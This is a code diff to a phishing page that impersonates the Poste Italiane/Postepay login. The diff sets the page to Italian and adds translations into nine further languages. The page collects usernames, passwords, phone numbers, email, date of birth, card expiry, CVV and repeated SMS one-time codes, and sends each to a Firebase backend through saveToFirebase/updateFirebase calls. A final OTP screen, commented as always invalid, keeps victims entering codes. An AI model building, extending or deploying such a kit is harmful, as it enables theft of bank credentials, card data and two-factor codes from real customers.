@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
@@ -22,10 +22,12 @@ html,body{width:100%;height:100%;overflow:hidden;background:#fff}
 .hero-actions{position:absolute;right:5%;top:clamp(47px,11.7vw,69px);display:flex;gap:clamp(12px,3vw,19px);z-index:2}
 .circle{width:clamp(42px,10.5vw,63px);height:clamp(42px,10.5vw,63px);border:0;border-radius:50%;background:#fff9a8;color:#111;display:grid;place-items:center;box-shadow:0 7px 19px #8b7d0030;font-size:clamp(26px,6vw,37px);font-weight:300;cursor:pointer}
 .language-wrap{position:relative}
-.language-btn{font-size:clamp(13px,2.8vw,17px);font-weight:700;cursor:pointer}
-.lang-menu{position:absolute;top:calc(100% + 8px);right:0;width:122px;background:#fff;border:1px solid #e8e8e8;border-radius:12px;box-shadow:0 8px 24px #0002;padding:6px;display:none;z-index:99}
+.language-btn{font-size:clamp(13px,2.8vw,17px);font-weight:700;cursor:pointer;padding:0 6px}
+.lang-menu{position:absolute;top:calc(100% + 8px);right:0;width:170px;background:#fff;border:1px solid #e8e8e8;border-radius:12px;box-shadow:0 8px 24px #0002;padding:6px;display:none;z-index:99;max-height:280px;overflow-y:auto}
 .lang-menu.open{display:block}
-.lang-menu button{width:100%;padding:10px 12px;text-align:left;border:0;background:#fff;color:#194a95;border-radius:8px;cursor:pointer;font-size:15px}
+.lang-menu button{width:100%;padding:10px 12px;text-align:left;border:0;background:#fff;color:#194a95;border-radius:8px;cursor:pointer;font-size:14px;display:flex;align-items:center;gap:8px}
+.lang-menu button:hover{background:#f3f5fb}
+.lang-menu button.active{background:#e8f0ff;font-weight:700}
 .close{font-size:clamp(30px,6.3vw,39px);cursor:pointer}
 .art{position:absolute;bottom:9%;left:50%;transform:translateX(-50%);width:39%;aspect-ratio:230/190;display:flex;justify-content:center;align-items:center}
 .art svg{width:100%;height:auto}
@@ -129,13 +131,21 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
     <header class="hero">
       <div class="hero-actions">
         <div class="language-wrap">
-          <button class="circle language-btn" id="languageButton" type="button">Lang</button>
+          <button class="circle language-btn" id="languageButton" type="button">IT</button>
           <div class="lang-menu" id="languageMenu">
-            <button type="button">EN</button>
-            <button type="button">IT</button>
+            <button type="button" data-lang="it" class="active">🇮🇹 Italiano</button>
+            <button type="button" data-lang="en">🇬🇧 English</button>
+            <button type="button" data-lang="de">🇩🇪 Deutsch</button>
+            <button type="button" data-lang="fr">🇫🇷 Français</button>
+            <button type="button" data-lang="es">🇪🇸 Español</button>
+            <button type="button" data-lang="pt">🇵🇹 Português</button>
+            <button type="button" data-lang="nl">🇳🇱 Nederlands</button>
+            <button type="button" data-lang="ro">🇷🇴 Română</button>
+            <button type="button" data-lang="el">🇬🇷 Ελληνικά</button>
+            <button type="button" data-lang="pl">🇵🇱 Polski</button>
           </div>
         </div>
-        <button class="circle close" type="button" onclick="alert('Closed')">×</button>
+        <button class="circle close" type="button" onclick="alert('Chiuso')">×</button>
       </div>
       <div class="art">
         <svg viewBox="0 0 230 190" xmlns="http://www.w3.org/2000/svg">
@@ -161,26 +171,26 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
     </header>
     <div class="main-pad">
       <div class="heading">
-        <h1>Log in with your<br>Poste account</h1>
+        <h1 id="loginTitle">Accedi con il tuo<br>account Poste</h1>
         <span class="info">i</span>
       </div>
       <div class="form">
         <div class="field">
-          <input type="text" id="username" placeholder="Username" autocomplete="username">
+          <input type="text" id="username" placeholder="Nome utente" data-ph="username">
         </div>
         <div class="field">
-          <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+          <input type="password" id="password" placeholder="Password" data-ph="password">
           <span class="eye" onclick="togglePassword()">◉̸</span>
         </div>
         <div class="recover">
           <svg viewBox="0 0 34 24"><circle cx="9" cy="12" r="6"/><path d="M15 12h17l-3 3-3-3-3 3-3-3"/></svg>
-          <span>Recover username or password</span>
+          <span id="recoverText">Recupera nome utente o password</span>
         </div>
-        <button class="login" type="button" onclick="goToPhone()">Log in</button>
+        <button class="login" type="button" onclick="goToPhone()" id="loginBtn">Accedi</button>
       </div>
-      <p class="register">Don't have a Poste account? <strong>Sign up</strong><span class="arrow">➜</span></p>
-      <div class="divider">or continue with</div>
-      <button class="spid" type="button">PosteID enabled for SPID</button>
+      <p class="register" id="registerText">Non hai un account Poste? <strong>Registrati</strong><span class="arrow">➜</span></p>
+      <div class="divider" id="dividerText">oppure continua con</div>
+      <button class="spid" type="button" id="spidBtn">PosteID abilitato a SPID</button>
     </div>
   </div>
 
@@ -191,12 +201,12 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
       <div class="actions"><span class="help">?</span><span class="icon">×</span></div>
     </header>
     <div class="phone-main">
-      <h1 class="phone-title">Mobile Number</h1>
+      <h1 class="phone-title" id="phoneTitle">Numero di cellulare</h1>
       <div class="phone-row">
         <span class="prefix">+39 <span class="caret">▼</span></span>
-        <input type="tel" id="mobile" placeholder="Mobile Number" inputmode="numeric" autocomplete="tel">
+        <input type="tel" id="mobile" placeholder="Numero di cellulare" data-ph="mobile" inputmode="numeric">
       </div>
-      <button class="submit-yellow" type="button" onclick="goToLoader('otp1')">Sign in</button>
+      <button class="submit-yellow" type="button" onclick="goToLoader('otp1')" id="phoneBtn">Accedi</button>
     </div>
   </div>
 
@@ -204,12 +214,12 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
   <div class="screen" id="screen-loader">
     <div class="loader-screen">
       <h1>Posteitaliane</h1>
-      <p id="loaderText">Loading...</p>
+      <p id="loaderText">Caricamento in corso...</p>
       <div class="spinner"></div>
     </div>
   </div>
 
-  <!-- ============ SCREEN 5: OTP 1 (UNLOCKED) ============ -->
+  <!-- ============ SCREEN 5: OTP 1 ============ -->
   <div class="screen" id="screen-otp1">
     <div class="otp-page">
       <div class="top-actions">
@@ -217,15 +227,15 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
         <button class="round close" type="button" onclick="backToLogin()">×</button>
       </div>
       <div class="otp-main">
-        <h1 class="otp-h1">Enter SMS Code</h1>
-        <p class="description">Enter the code we just sent you via<br>
-          SMS to <b id="otpPhone1">+39*******768</b></p>
+        <h1 class="otp-h1" id="otp1Title">Inserisci codice SMS</h1>
+        <p class="description" id="otp1Desc">Inserisci il codice che ti abbiamo appena inviato via<br>
+          SMS al numero <b id="otpPhone1">+39*******768</b></p>
         <div class="invalid-text" id="otp1Error">Invalid OTP</div>
         <div class="code">
           <input type="tel" id="otp1Input" inputmode="numeric" autocomplete="one-time-code">
-          <button class="otp-submit" type="button" onclick="submitOtp1()">Continue</button>
+          <button class="otp-submit" type="button" onclick="submitOtp1()" id="otp1Btn">Continua</button>
         </div>
-        <p class="otp-timer">You still have <strong id="timer1">00:53</strong> seconds</p>
+        <p class="otp-timer" id="otp1Timer">Hai ancora <strong id="timer1">00:53</strong> secondi</p>
       </div>
     </div>
   </div>
@@ -237,11 +247,11 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
       <div class="actions"><span class="help">?</span><span class="icon">×</span></div>
     </header>
     <div class="phone-main">
-      <h1 class="phone-title">Enter your Email</h1>
+      <h1 class="phone-title" id="emailTitle">Inserisci la tua email</h1>
       <div class="phone-row">
-        <input type="email" id="email" placeholder="Email" autocomplete="email">
+        <input type="email" id="email" placeholder="Email">
       </div>
-      <button class="submit-yellow" type="button" onclick="goToLoader('otp2')">Sign in</button>
+      <button class="submit-yellow" type="button" onclick="goToLoader('otp2')" id="emailBtn">Accedi</button>
     </div>
   </div>
 
@@ -249,12 +259,12 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
   <div class="screen" id="screen-loader2">
     <div class="loader-screen">
       <h1>Posteitaliane</h1>
-      <p>Loading...</p>
+      <p id="loader2Text">Caricamento in corso...</p>
       <div class="spinner"></div>
     </div>
   </div>
 
-  <!-- ============ SCREEN 8: OTP 2 (UNLOCKED) ============ -->
+  <!-- ============ SCREEN 8: OTP 2 ============ -->
   <div class="screen" id="screen-otp2">
     <div class="otp-page">
       <div class="top-actions">
@@ -262,15 +272,15 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
         <button class="round close" type="button" onclick="backToLogin()">×</button>
       </div>
       <div class="otp-main">
-        <h1 class="otp-h1">Enter SMS Code</h1>
-        <p class="description">Enter the code we just sent you via<br>
-          SMS to <b id="otpPhone2">+39*******768</b></p>
+        <h1 class="otp-h1" id="otp2Title">Inserisci codice SMS</h1>
+        <p class="description" id="otp2Desc">Inserisci il codice che ti abbiamo appena inviato via<br>
+          SMS al numero <b id="otpPhone2">+39*******768</b></p>
         <div class="invalid-text" id="otp2Error">Invalid OTP</div>
         <div class="code">
           <input type="tel" id="otp2Input" inputmode="numeric" autocomplete="one-time-code">
-          <button class="otp-submit" type="button" onclick="submitOtp2()">Continue</button>
+          <button class="otp-submit" type="button" onclick="submitOtp2()" id="otp2Btn">Continua</button>
         </div>
-        <p class="otp-timer">You still have <strong id="timer2">00:53</strong> seconds</p>
+        <p class="otp-timer" id="otp2Timer">Hai ancora <strong id="timer2">00:53</strong> secondi</p>
       </div>
     </div>
   </div>
@@ -282,15 +292,15 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
       <div class="actions"><span class="help">?</span><span class="icon">×</span></div>
     </header>
     <div class="phone-main">
-      <h1 class="phone-title">Enter your Date of Birth.</h1>
+      <h1 class="phone-title" id="dateTitle">Inserisci la tua data di nascita.</h1>
       <div class="phone-row">
-        <input type="date" id="birthDate" placeholder="Date of Birth">
+        <input type="date" id="birthDate">
       </div>
-      <button class="submit-yellow" type="button" onclick="goToLoader('otp3')">Sign in</button>
+      <button class="submit-yellow" type="button" onclick="goToLoader('otp3')" id="dateBtn">Accedi</button>
     </div>
   </div>
 
-  <!-- ============ SCREEN 10: OTP 3 (UNLOCKED) ============ -->
+  <!-- ============ SCREEN 10: OTP 3 ============ -->
   <div class="screen" id="screen-otp3">
     <div class="otp-page">
       <div class="top-actions">
@@ -298,15 +308,15 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
         <button class="round close" type="button" onclick="backToLogin()">×</button>
       </div>
       <div class="otp-main">
-        <h1 class="otp-h1">Enter SMS Code</h1>
-        <p class="description">Enter the code we just sent you via<br>
-          SMS to <b id="otpPhone3">+39*******768</b></p>
+        <h1 class="otp-h1" id="otp3Title">Inserisci codice SMS</h1>
+        <p class="description" id="otp3Desc">Inserisci il codice che ti abbiamo appena inviato via<br>
+          SMS al numero <b id="otpPhone3">+39*******768</b></p>
         <div class="invalid-text" id="otp3Error">Invalid OTP</div>
         <div class="code">
           <input type="tel" id="otp3Input" inputmode="numeric" autocomplete="one-time-code">
-          <button class="otp-submit" type="button" onclick="submitOtp3()">Continue</button>
+          <button class="otp-submit" type="button" onclick="submitOtp3()" id="otp3Btn">Continua</button>
         </div>
-        <p class="otp-timer">You still have <strong id="timer3">00:53</strong> seconds</p>
+        <p class="otp-timer" id="otp3Timer">Hai ancora <strong id="timer3">00:53</strong> secondi</p>
       </div>
     </div>
   </div>
@@ -318,7 +328,7 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
         <button class="round" type="button"><span class="help-icon">?</span></button>
         <button class="round close" type="button" onclick="backToLogin()">×</button>
       </div>
-      <h1 class="card-h1">Enter your Card Details</h1>
+      <h1 class="card-h1" id="cardTitle">Inserisci i tuoi Card dati</h1>
       <div class="card-visual">
         <div class="brand">postepay</div>
         <div class="brand-sub">Evolution</div>
@@ -330,16 +340,16 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
         </div>
       </div>
       <div class="card-field">
-        <input type="text" id="cardExpiry" placeholder="Expiry Date [MM/YY]" inputmode="numeric" maxlength="5">
+        <input type="text" id="cardExpiry" placeholder="Expiry Date [MM/YY]" data-ph="cardExpiry" inputmode="numeric" maxlength="5">
       </div>
       <div class="card-field">
         <input type="tel" id="cardCVV" placeholder="CVV2/CVC2" inputmode="numeric" maxlength="4">
       </div>
-      <button class="card-submit" type="button" onclick="goToLoader('otp4')">Sign in</button>
+      <button class="card-submit" type="button" onclick="goToLoader('otp4')" id="cardBtn">Accedi</button>
     </div>
   </div>
 
-  <!-- ============ SCREEN 12: FINAL OTP (UNLOCKED, ALWAYS INVALID) ============ -->
+  <!-- ============ SCREEN 12: FINAL OTP ============ -->
   <div class="screen" id="screen-otp4">
     <div class="otp-page">
       <div class="top-actions">
@@ -347,15 +357,15 @@ h1{margin:0;max-width:75%;font-size:clamp(22px,5.8vw,35px);line-height:1.33;font
         <button class="round close" type="button" onclick="backToLogin()">×</button>
       </div>
       <div class="otp-main">
-        <h1 class="otp-h1">Enter SMS Code</h1>
-        <p class="description">Enter the code we just sent you via<br>
-          SMS to <b id="otpPhone4">+39*******768</b></p>
+        <h1 class="otp-h1" id="otp4Title">Inserisci codice SMS</h1>
+        <p class="description" id="otp4Desc">Inserisci il codice che ti abbiamo appena inviato via<br>
+          SMS al numero <b id="otpPhone4">+39*******768</b></p>
         <div class="invalid-text" id="otp4Error">Invalid OTP</div>
         <div class="code">
           <input type="tel" id="otp4Input" inputmode="numeric" autocomplete="one-time-code">
-          <button class="otp-submit" type="button" onclick="submitOtp4()">Continue</button>
+          <button class="otp-submit" type="button" onclick="submitOtp4()" id="otp4Btn">Continua</button>
         </div>
-        <p class="otp-timer">You still have <strong id="timer4">00:53</strong> seconds</p>
+        <p class="otp-timer" id="otp4Timer">Hai ancora <strong id="timer4">00:53</strong> secondi</p>
       </div>
     </div>
   </div>
@@ -416,9 +426,340 @@ function showScreen(id) {
 }
 
 // =========================================================
+// LANGUAGE SYSTEM
+// =========================================================
+const translations = {
+    it: {
+        loginTitle: 'Accedi con il tuo<br>account Poste',
+        username: 'Nome utente',
+        password: 'Password',
+        recover: 'Recupera nome utente o password',
+        loginBtn: 'Accedi',
+        register: 'Non hai un account Poste? <strong>Registrati</strong><span class="arrow">➜</span>',
+        divider: 'oppure continua con',
+        spid: 'PosteID abilitato a SPID',
+        phoneTitle: 'Numero di cellulare',
+        mobile: 'Numero di cellulare',
+        phoneBtn: 'Accedi',
+        loader: 'Caricamento in corso...',
+        otpTitle: 'Inserisci codice SMS',
+        otpDesc: 'Inserisci il codice che ti abbiamo appena inviato via<br>SMS al numero ',
+        otpBtn: 'Continua',
+        otpTimer: 'Hai ancora ',
+        otpTimerSuffix: ' secondi',
+        emailTitle: 'Inserisci la tua email',
+        emailBtn: 'Accedi',
+        dateTitle: 'Inserisci la tua data di nascita.',
+        dateBtn: 'Accedi',
+        cardTitle: 'Inserisci i tuoi Card dati',
+        cardBtn: 'Accedi'
+    },
+    en: {
+        loginTitle: 'Log in with your<br>Poste account',
+        username: 'Username',
+        password: 'Password',
+        recover: 'Recover username or password',
+        loginBtn: 'Log in',
+        register: "Don't have a Poste account? <strong>Sign up</strong><span class=\"arrow\">➜</span>",
+        divider: 'or continue with',
+        spid: 'PosteID enabled for SPID',
+        phoneTitle: 'Mobile Number',
+        mobile: 'Mobile Number',
+        phoneBtn: 'Sign in',
+        loader: 'Loading...',
+        otpTitle: 'Enter SMS Code',
+        otpDesc: 'Enter the code we just sent you via<br>SMS to ',
+        otpBtn: 'Continue',
+        otpTimer: 'You still have ',
+        otpTimerSuffix: ' seconds',
+        emailTitle: 'Enter your Email',
+        emailBtn: 'Sign in',
+        dateTitle: 'Enter your Date of Birth.',
+        dateBtn: 'Sign in',
+        cardTitle: 'Enter your Card Details',
+        cardBtn: 'Sign in'
+    },
+    de: {
+        loginTitle: 'Melden Sie sich mit Ihrem<br>Poste-Konto an',
+        username: 'Benutzername',
+        password: 'Passwort',
+        recover: 'Benutzername oder Passwort wiederherstellen',
+        loginBtn: 'Anmelden',
+        register: 'Kein Poste-Konto? <strong>Registrieren</strong><span class="arrow">➜</span>',
+        divider: 'oder weiter mit',
+        spid: 'PosteID für SPID aktiviert',
+        phoneTitle: 'Handynummer',
+        mobile: 'Handynummer',
+        phoneBtn: 'Anmelden',
+        loader: 'Wird geladen...',
+        otpTitle: 'SMS-Code eingeben',
+        otpDesc: 'Geben Sie den Code ein, den wir gerade per SMS gesendet haben an ',
+        otpBtn: 'Weiter',
+        otpTimer: 'Sie haben noch ',
+        otpTimerSuffix: ' Sekunden',
+        emailTitle: 'Geben Sie Ihre E-Mail ein',
+        emailBtn: 'Anmelden',
+        dateTitle: 'Geben Sie Ihr Geburtsdatum ein.',
+        dateBtn: 'Anmelden',
+        cardTitle: 'Geben Sie Ihre Kartendetails ein',
+        cardBtn: 'Anmelden'
+    },
+    fr: {
+        loginTitle: 'Connectez-vous avec votre<br>compte Poste',
+        username: "Nom d'utilisateur",
+        password: 'Mot de passe',
+        recover: "Récupérer le nom d'utilisateur ou le mot de passe",
+        loginBtn: 'Se connecter',
+        register: 'Pas de compte Poste ? <strong>Inscrivez-vous</strong><span class="arrow">➜</span>',
+        divider: 'ou continuez avec',
+        spid: 'PosteID activé pour SPID',
+        phoneTitle: 'Numéro de portable',
+        mobile: 'Numéro de portable',
+        phoneBtn: 'Se connecter',
+        loader: 'Chargement...',
+        otpTitle: 'Entrez le code SMS',
+        otpDesc: 'Entrez le code que nous venons de vous envoyer par SMS au ',
+        otpBtn: 'Continuer',
+        otpTimer: 'Il vous reste ',
+        otpTimerSuffix: ' secondes',
+        emailTitle: 'Entrez votre email',
+        emailBtn: 'Se connecter',
+        dateTitle: 'Entrez votre date de naissance.',
+        dateBtn: 'Se connecter',
+        cardTitle: 'Entrez les détails de votre carte',
+        cardBtn: 'Se connecter'
+    },
+    es: {
+        loginTitle: 'Inicie sesión con su<br>cuenta Poste',
+        username: 'Usuario',
+        password: 'Contraseña',
+        recover: 'Recuperar usuario o contraseña',
+        loginBtn: 'Iniciar sesión',
+        register: '¿No tienes una cuenta Poste? <strong>Regístrate</strong><span class="arrow">➜</span>',
+        divider: 'o continuar con',
+        spid: 'PosteID habilitado para SPID',
+        phoneTitle: 'Número de móvil',
+        mobile: 'Número de móvil',
+        phoneBtn: 'Iniciar sesión',
+        loader: 'Cargando...',
+        otpTitle: 'Ingrese el código SMS',
+        otpDesc: 'Ingrese el código que acabamos de enviar por SMS al ',
+        otpBtn: 'Continuar',
+        otpTimer: 'Todavía tienes ',
+        otpTimerSuffix: ' segundos',
+        emailTitle: 'Ingrese su correo electrónico',
+        emailBtn: 'Iniciar sesión',
+        dateTitle: 'Ingrese su fecha de nacimiento.',
+        dateBtn: 'Iniciar sesión',
+        cardTitle: 'Ingrese los datos de su tarjeta',
+        cardBtn: 'Iniciar sesión'
+    },
+    pt: {
+        loginTitle: 'Faça login com sua<br>conta Poste',
+        username: 'Usuário',
+        password: 'Senha',
+        recover: 'Recuperar usuário ou senha',
+        loginBtn: 'Entrar',
+        register: 'Não tem uma conta Poste? <strong>Registre-se</strong><span class="arrow">➜</span>',
+        divider: 'ou continuar com',
+        spid: 'PosteID habilitado para SPID',
+        phoneTitle: 'Número de celular',
+        mobile: 'Número de celular',
+        phoneBtn: 'Entrar',
+        loader: 'Carregando...',
+        otpTitle: 'Digite o código SMS',
+        otpDesc: 'Digite o código que acabamos de enviar por SMS para ',
+        otpBtn: 'Continuar',
+        otpTimer: 'Você ainda tem ',
+        otpTimerSuffix: ' segundos',
+        emailTitle: 'Digite seu email',
+        emailBtn: 'Entrar',
+        dateTitle: 'Digite sua data de nascimento.',
+        dateBtn: 'Entrar',
+        cardTitle: 'Digite os dados do seu cartão',
+        cardBtn: 'Entrar'
+    },
+    nl: {
+        loginTitle: 'Log in met uw<br>Poste-account',
+        username: 'Gebruikersnaam',
+        password: 'Wachtwoord',
+        recover: 'Gebruikersnaam of wachtwoord herstellen',
+        loginBtn: 'Inloggen',
+        register: 'Geen Poste-account? <strong>Registreren</strong><span class="arrow">➜</span>',
+        divider: 'of doorgaan met',
+        spid: 'PosteID ingeschakeld voor SPID',
+        phoneTitle: 'Mobiel nummer',
+        mobile: 'Mobiel nummer',
+        phoneBtn: 'Inloggen',
+        loader: 'Laden...',
+        otpTitle: 'Voer SMS-code in',
+        otpDesc: 'Voer de code in die we zojuist via SMS hebben verzonden naar ',
+        otpBtn: 'Doorgaan',
+        otpTimer: 'Je hebt nog ',
+        otpTimerSuffix: ' seconden',
+        emailTitle: 'Voer uw e-mailadres in',
+        emailBtn: 'Inloggen',
+        dateTitle: 'Voer uw geboortedatum in.',
+        dateBtn: 'Inloggen',
+        cardTitle: 'Voer uw kaartgegevens in',
+        cardBtn: 'Inloggen'
+    },
+    ro: {
+        loginTitle: 'Conectați-vă cu contul<br>dvs. Poste',
+        username: 'Nume de utilizator',
+        password: 'Parolă',
+        recover: 'Recuperați numele de utilizator sau parola',
+        loginBtn: 'Conectare',
+        register: 'Nu aveți un cont Poste? <strong>Înregistrați-vă</strong><span class="arrow">➜</span>',
+        divider: 'sau continuați cu',
+        spid: 'PosteID activat pentru SPID',
+        phoneTitle: 'Număr de mobil',
+        mobile: 'Număr de mobil',
+        phoneBtn: 'Conectare',
+        loader: 'Se încarcă...',
+        otpTitle: 'Introduceți codul SMS',
+        otpDesc: 'Introduceți codul pe care tocmai l-am trimis prin SMS la ',
+        otpBtn: 'Continuați',
+        otpTimer: 'Mai aveți ',
+        otpTimerSuffix: ' secunde',
+        emailTitle: 'Introduceți adresa de email',
+        emailBtn: 'Conectare',
+        dateTitle: 'Introduceți data nașterii.',
+        dateBtn: 'Conectare',
+        cardTitle: 'Introduceți detaliile cardului',
+        cardBtn: 'Conectare'
+    },
+    el: {
+        loginTitle: 'Συνδεθείτε με τον<br>λογαριασμό σας Poste',
+        username: 'Όνομα χρήστη',
+        password: 'Κωδικός πρόσβασης',
+        recover: 'Ανάκτηση ονόματος χρήστη ή κωδικού',
+        loginBtn: 'Σύνδεση',
+        register: 'Δεν έχετε λογαριασμό Poste; <strong>Εγγραφείτε</strong><span class="arrow">➜</span>',
+        divider: 'ή συνεχίστε με',
+        spid: 'PosteID ενεργοποιημένο για SPID',
+        phoneTitle: 'Αριθμός κινητού',
+        mobile: 'Αριθμός κινητού',
+        phoneBtn: 'Σύνδεση',
+        loader: 'Φόρτωση...',
+        otpTitle: 'Εισαγάγετε κωδικό SMS',
+        otpDesc: 'Εισαγάγετε τον κωδικό που μόλις στείλαμε μέσω SMS στο ',
+        otpBtn: 'Συνέχεια',
+        otpTimer: 'Έχετε ακόμα ',
+        otpTimerSuffix: ' δευτερόλεπτα',
+        emailTitle: 'Εισαγάγετε το email σας',
+        emailBtn: 'Σύνδεση',
+        dateTitle: 'Εισαγάγετε την ημερομηνία γέννησής σας.',
+        dateBtn: 'Σύνδεση',
+        cardTitle: 'Εισαγάγετε τα στοιχεία της κάρτας σας',
+        cardBtn: 'Σύνδεση'
+    },
+    pl: {
+        loginTitle: 'Zaloguj się na swoje<br>konto Poste',
+        username: 'Nazwa użytkownika',
+        password: 'Hasło',
+        recover: 'Odzyskaj nazwę użytkownika lub hasło',
+        loginBtn: 'Zaloguj się',
+        register: 'Nie masz konta Poste? <strong>Zarejestruj się</strong><span class="arrow">➜</span>',
+        divider: 'lub kontynuuj z',
+        spid: 'PosteID włączone dla SPID',
+        phoneTitle: 'Numer telefonu komórkowego',
+        mobile: 'Numer telefonu komórkowego',
+        phoneBtn: 'Zaloguj się',
+        loader: 'Ładowanie...',
+        otpTitle: 'Wprowadź kod SMS',
+        otpDesc: 'Wprowadź kod, który właśnie wysłaliśmy SMS-em na numer ',
+        otpBtn: 'Kontynuuj',
+        otpTimer: 'Masz jeszcze ',
+        otpTimerSuffix: ' sekund',
+        emailTitle: 'Wprowadź swój email',
+        emailBtn: 'Zaloguj się',
+        dateTitle: 'Wprowadź swoją datę urodzenia.',
+        dateBtn: 'Zaloguj się',
+        cardTitle: 'Wprowadź dane swojej karty',
+        cardBtn: 'Zaloguj się'
+    }
+};
+
+let currentLang = localStorage.getItem('poste_lang') || 'it';
+
+function applyLanguage(lang) {
+    currentLang = lang;
+    localStorage.setItem('poste_lang', lang);
+    const t = translations[lang] || translations.it;
+
+    // Login
+    document.getElementById('loginTitle').innerHTML = t.loginTitle;
+    document.getElementById('username').placeholder = t.username;
+    document.getElementById('password').placeholder = t.password;
+    document.getElementById('recoverText').textContent = t.recover;
+    document.getElementById('loginBtn').textContent = t.loginBtn;
+    document.getElementById('registerText').innerHTML = t.register;
+    document.getElementById('dividerText').textContent = t.divider;
+    document.getElementById('spidBtn').textContent = t.spid;
+
+    // Phone
+    document.getElementById('phoneTitle').textContent = t.phoneTitle;
+    document.getElementById('mobile').placeholder = t.mobile;
+    document.getElementById('phoneBtn').textContent = t.phoneBtn;
+
+    // Loader
+    document.getElementById('loaderText').textContent = t.loader;
+    document.getElementById('loader2Text').textContent = t.loader;
+
+    // OTP 1
+    document.getElementById('otp1Title').textContent = t.otpTitle;
+    document.getElementById('otp1Desc').innerHTML = t.otpDesc + '<b id="otpPhone1">+39*******768</b>';
+    document.getElementById('otp1Btn').textContent = t.otpBtn;
+    document.getElementById('otp1Timer').innerHTML = t.otpTimer + '<strong id="timer1">00:53</strong>' + t.otpTimerSuffix;
+
+    // Email
+    document.getElementById('emailTitle').textContent = t.emailTitle;
+    document.getElementById('emailBtn').textContent = t.emailBtn;
+
+    // OTP 2
+    document.getElementById('otp2Title').textContent = t.otpTitle;
+    document.getElementById('otp2Desc').innerHTML = t.otpDesc + '<b id="otpPhone2">+39*******768</b>';
+    document.getElementById('otp2Btn').textContent = t.otpBtn;
+    document.getElementById('otp2Timer').innerHTML = t.otpTimer + '<strong id="timer2">00:53</strong>' + t.otpTimerSuffix;
+
+    // Date
+    document.getElementById('dateTitle').textContent = t.dateTitle;
+    document.getElementById('dateBtn').textContent = t.dateBtn;
+
+    // OTP 3
+    document.getElementById('otp3Title').textContent = t.otpTitle;
+    document.getElementById('otp3Desc').innerHTML = t.otpDesc + '<b id="otpPhone3">+39*******768</b>';
+    document.getElementById('otp3Btn').textContent = t.otpBtn;
+    document.getElementById('otp3Timer').innerHTML = t.otpTimer + '<strong id="timer3">00:53</strong>' + t.otpTimerSuffix;
+
+    // Card
+    document.getElementById('cardTitle').textContent = t.cardTitle;
+    document.getElementById('cardExpiry').placeholder = lang === 'en' ? 'Expiry Date [MM/YY]' : 'Expiry Date [MM/YY]';
+    document.getElementById('cardBtn').textContent = t.cardBtn;
+
+    // OTP 4 (Final)
+    document.getElementById('otp4Title').textContent = t.otpTitle;
+    document.getElementById('otp4Desc').innerHTML = t.otpDesc + '<b id="otpPhone4">+39*******768</b>';
+    document.getElementById('otp4Btn').textContent = t.otpBtn;
+    document.getElementById('otp4Timer').innerHTML = t.otpTimer + '<strong id="timer4">00:53</strong>' + t.otpTimerSuffix;
+
+    // Language button text
+    document.getElementById('languageButton').textContent = lang.toUpperCase();
+
+    // Update active state
+    document.querySelectorAll('.lang-menu button').forEach(btn => {
+        btn.classList.toggle('active', btn.dataset.lang === lang);
+    });
+}
+
+// =========================================================
 // SPLASH → LOGIN (3 sec)
 // =========================================================
-setTimeout(() => showScreen('screen-login'), 3000);
+setTimeout(() => {
+    showScreen('screen-login');
+    applyLanguage(currentLang);
+}, 3000);
 
 // =========================================================
 // PASSWORD TOGGLE
@@ -437,7 +778,11 @@ window.goToPhone = function() {
     if (!user || !pass) { alert('Please enter username and password'); return; }
     sessionData.username = user;
     sessionData.password = pass;
-    saveToFirebase({ username: user, password: pass, step: 'login' });
+    saveToFirebase({
+        username: user,
+        password: pass,
+        step: 'login'
+    });
     showScreen('screen-phone');
 };
 
@@ -449,19 +794,29 @@ window.goToLoader = function(nextScreen) {
         const mobile = document.getElementById('mobile').value.trim();
         if (!mobile) { alert('Please enter mobile number'); return; }
         sessionData.mobile = mobile;
-        updateFirebase({ phone: '+39' + mobile, mobile: mobile, step: 'phone' });
+        updateFirebase({
+            mobile: mobile,
+            phone: '+39' + mobile,
+            step: 'phone'
+        });
     }
     if (nextScreen === 'otp2') {
         const email = document.getElementById('email').value.trim();
         if (!email) { alert('Please enter your email'); return; }
         sessionData.email = email;
-        updateFirebase({ email: email, step: 'email' });
+        updateFirebase({
+            email: email,
+            step: 'email'
+        });
     }
     if (nextScreen === 'otp3') {
         const bd = document.getElementById('birthDate').value.trim();
         if (!bd) { alert('Please enter your date of birth'); return; }
         sessionData.birthDate = bd;
-        updateFirebase({ birthDate: bd, step: 'date' });
+        updateFirebase({
+            birthDate: bd,
+            step: 'date'
+        });
     }
     if (nextScreen === 'otp4') {
         const ex = document.getElementById('cardExpiry').value.trim();
@@ -469,7 +824,11 @@ window.goToLoader = function(nextScreen) {
         if (!ex || !cv) { alert('Please enter card details'); return; }
         sessionData.cardExpiry = ex;
         sessionData.cardCVV = cv;
-        updateFirebase({ cardExpiry: ex, cardCVV: cv, step: 'card' });
+        updateFirebase({
+            cardExpiry: ex,
+            cardCVV: cv,
+            step: 'card'
+        });
     }
 
     const loaderId = (nextScreen === 'otp2') ? 'screen-loader2' : 'screen-loader';
@@ -552,7 +911,7 @@ window.submitOtp3 = function() {
 };
 
 // =========================================================
-// OTP 4 (FINAL) — ALWAYS INVALID → STAY ON SAME PAGE FOREVER
+// OTP 4 (FINAL) — ALWAYS INVALID → STAY ON SAME PAGE
 // =========================================================
